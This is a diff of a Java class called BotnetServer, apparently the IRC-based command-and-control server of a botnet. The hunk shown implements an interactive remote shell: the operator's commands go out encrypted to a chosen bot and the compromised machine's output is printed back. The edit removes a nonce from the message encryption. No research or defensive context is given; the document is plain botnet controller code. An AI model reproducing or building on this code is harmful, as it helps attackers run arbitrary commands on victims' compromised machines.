@@ -452,11 +452,11 @@ public class BotnetServer extends PircBot {
 			Scanner shellout = new Scanner(chat.getBufferedReader());
 			
 			try {
-				chat.sendLine(botKeys.get(botNick).encryptMsg("shell", getNonce(botNick)));
+				chat.sendLine(botKeys.get(botNick).encryptMsg("shell"));
 				System.out.print(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
-					chat.sendLine(botKeys.get(botNick).encryptMsg(command, getNonce(botNick)));
+					chat.sendLine(botKeys.get(botNick).encryptMsg(command));
 					String response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
@@ -465,7 +465,7 @@ public class BotnetServer extends PircBot {
 					System.out.print(response);
 					command = input.nextLine();
 				}
-				chat.sendLine(botKeys.get(botNick).encryptMsg(command, getNonce(botNick)));
+				chat.sendLine(botKeys.get(botNick).encryptMsg(command));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
